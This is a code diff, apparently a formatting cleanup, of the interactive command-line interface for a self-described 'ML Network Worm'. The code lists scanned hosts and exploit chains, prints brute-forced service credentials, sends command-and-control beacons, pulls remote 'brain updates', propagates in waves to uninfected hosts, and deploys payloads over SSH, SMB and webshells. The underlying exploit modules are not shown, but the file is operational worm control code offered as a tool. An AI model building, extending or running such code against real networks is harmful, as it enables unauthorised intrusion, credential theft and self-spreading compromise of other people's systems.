@@ -3,10 +3,10 @@ Wormy ML Network Worm v4.0 — Interactive CLI
 """
 
 import cmd
+import hashlib
+import os
 import sys
 import time
-import os
-import hashlib
 from datetime import datetime
 from typing import Optional
 
@@ -49,11 +49,11 @@ class InteractiveCLI(cmd.Cmd):
             chain = len(host.get("exploit_chain", []))
 
             table.add_row(
-                host['ip'],
-                host.get('os_guess', 'Unknown')[:15],
-                ", ".join(map(str, host.get('open_ports', [])))[:30],
+                host["ip"],
+                host.get("os_guess", "Unknown")[:15],
+                ", ".join(map(str, host.get("open_ports", [])))[:30],
                 f"[{'red' if vulns > 0 else 'dim'}]{vulns}[/]",
-                f"[{'red bold' if chain > 0 else 'dim'}]{chain}[/]"
+                f"[{'red bold' if chain > 0 else 'dim'}]{chain}[/]",
             )
 
         console.print(table)
@@ -70,11 +70,13 @@ class InteractiveCLI(cmd.Cmd):
         for host in self.worm.scan_results:
             ip = host["ip"]
             status = (
-                "INFECTED" if ip in self.worm.infected_hosts
-                else "FAILED" if ip in self.worm.failed_targets
-                else "DISCOVERED"
+                "INFECTED"
+                if ip in self.worm.infected_hosts
+                else "FAILED" if ip in self.worm.failed_targets else "DISCOVERED"
             )
-            print(f"  [{status}] {ip} - {host.get('os_guess', 'Unknown')} - Ports: {host.get('open_ports', [])}")
+            print(
+                f"  [{status}] {ip} - {host.get('os_guess', 'Unknown')} - Ports: {host.get('open_ports', [])}"
+            )
 
     def do_exploit(self, arg):
         """Exploit a specific target. Usage: exploit <ip>"""
@@ -111,7 +113,9 @@ class InteractiveCLI(cmd.Cmd):
                 if vulns:
                     print(f"\nVulnerabilities for {ip}:")
                     for v in vulns:
-                        print(f"  [{v.get('severity', 'UNKNOWN')}] {v.get('name', '')} (CVSS: {v.get('cvss', 0)})")
+                        print(
+                            f"  [{v.get('severity', 'UNKNOWN')}] {v.get('name', '')} (CVSS: {v.get('cvss', 0)})"
+                        )
                         print(f"    CVE: {v.get('cve', 'N/A')}")
                         print(f"    {v.get('description', '')}")
                 else:
@@ -131,7 +135,9 @@ class InteractiveCLI(cmd.Cmd):
                 if chain:
                     print(f"\nExploit chain for {ip}:")
                     for step in chain:
-                        print(f"  Step {step['step']}: [{step['phase']}] {step['name']} ({step.get('cve', 'N/A')})")
+                        print(
+                            f"  Step {step['step']}: [{step['phase']}] {step['name']} ({step.get('cve', 'N/A')})"
+                        )
                 else:
                     print(f"No exploit chain for {ip}")
                 return
@@ -196,7 +202,9 @@ class InteractiveCLI(cmd.Cmd):
             if results:
                 print(f"\nBrute force successful on {ip}:")
                 for r in results:
-                    print(f"  {r.get('service', '?')}:{r.get('username', '?')}:{r.get('password', '?')}")
+                    print(
+                        f"  {r.get('service', '?')}:{r.get('username', '?')}:{r.get('password', '?')}"
+                    )
             else:
                 print(f"Brute force failed on {ip}")
         else:
@@ -207,16 +215,24 @@ class InteractiveCLI(cmd.Cmd):
         if not self.worm.host_monitor:
             print("Host Monitor not available")
             return
-        hosts = {h["ip"]: {"os_guess": h.get("os_guess", "Unknown"), "open_ports": h.get("open_ports", [])}
-                 for h in self.worm.scan_results}
+        hosts = {
+            h["ip"]: {
+                "os_guess": h.get("os_guess", "Unknown"),
+                "open_ports": h.get("open_ports", []),
+            }
+            for h in self.worm.scan_results
+        }
         from utils.topology_visualizer import TopologyVisualizer
+
         tv = TopologyVisualizer()
         lateral_movements = []
         if self.worm.host_monitor:
             for ip in self.worm.host_monitor.hosts:
                 for lm in self.worm.host_monitor.hosts[ip].lateral_movement_history:
                     lateral_movements.append({"source": ip, **lm})
-        results = tv.generate_all(hosts, self.worm.infected_hosts, self.worm.failed_targets, lateral_movements)
+        results = tv.generate_all(
+            hosts, self.worm.infected_hosts, self.worm.failed_targets, lateral_movements
+        )
         print(f"\nTopology maps generated:")
         for fmt, path in results.items():
             print(f"  {fmt}: {path}")
@@ -258,7 +274,9 @@ class InteractiveCLI(cmd.Cmd):
             if activities:
                 print(f"\nRecent Activity (last {len(activities)}):")
                 for act in activities:
-                    print(f"  [{act['timestamp'][11:19]}] {act['host_ip']:<15} {act['type']:<20} {str(act['details'])[:50]}")
+                    print(
+                        f"  [{act['timestamp'][11:19]}] {act['host_ip']:<15} {act['type']:<20} {str(act['details'])[:50]}"
+                    )
             else:
                 print("No activities recorded yet")
         else:
@@ -315,6 +333,7 @@ Wormy ML Network Worm v4.0 - Available Commands:
         self.worm.stats["start_time"] = self.worm.start_time
 
         from worm_core import get_local_ip
+
         local_ip = get_local_ip()
         self.worm._safe_add_infected(local_ip)
 
@@ -351,7 +370,7 @@ Wormy ML Network Worm v4.0 - Available Commands:
                 self.worm._online_learning_step()
 
             # OTA Brain Updates
-            if self.worm.c2_server and getattr(self.worm.c2_server, 'pending_brain_update', None):
+            if self.worm.c2_server and getattr(self.worm.c2_server, "pending_brain_update", None):
                 try:
                     update_path = self.worm.c2_server.pending_brain_update
                     if os.path.exists(update_path):
@@ -380,22 +399,29 @@ Wormy ML Network Worm v4.0 - Available Commands:
             # C2 beacon
             if self.worm.c2_server and target["ip"] in self.worm.infected_hosts:
                 try:
-                    self.worm.c2_server.process_beacon({
-                        "host_id": target["ip"],
-                        "ip": target["ip"],
-                        "hostname": target.get("hostname", "unknown"),
-                        "os": target.get("os_guess", "Unknown"),
-                        "ports": target.get("open_ports", []),
-                        "beacon_type": "infection",
-                    })
+                    self.worm.c2_server.process_beacon(
+                        {
+                            "host_id": target["ip"],
+                            "ip": target["ip"],
+                            "hostname": target.get("hostname", "unknown"),
+                            "os": target.get("os_guess", "Unknown"),
+                            "ports": target.get("open_ports", []),
+                            "beacon_type": "infection",
+                        }
+                    )
                 except Exception:
                     pass
 
             # Wave propagation
-            if self.worm.wave_propagation and iteration % 3 == 0 and len(self.worm.infected_hosts) > 1:
+            if (
+                self.worm.wave_propagation
+                and iteration % 3 == 0
+                and len(self.worm.infected_hosts) > 1
+            ):
                 try:
                     targets = [
-                        h for h in self.worm.scan_results
+                        h
+                        for h in self.worm.scan_results
                         if h["ip"] not in self.worm.infected_hosts
                         and h["ip"] not in self.worm.failed_targets
                     ]
@@ -456,9 +482,13 @@ Wormy ML Network Worm v4.0 - Available Commands:
         success = False
         for port in ports:
             if port == 22:
-                success = self.worm.payload_deployer.deploy_via_ssh(ip, port, username, password, payload_type=ptype)
+                success = self.worm.payload_deployer.deploy_via_ssh(
+                    ip, port, username, password, payload_type=ptype
+                )
             elif port in (445, 139):
-                success = self.worm.payload_deployer.deploy_via_smb(ip, username, password, payload_type=ptype)
+                success = self.worm.payload_deployer.deploy_via_smb(
+                    ip, username, password, payload_type=ptype
+                )
             elif port in (80, 443, 8080):
                 success = self.worm.payload_deployer.deploy_webshell(ip, port, username, password)
         print(f"Payload deploy {'succeeded' if success else 'failed'} on {ip}")
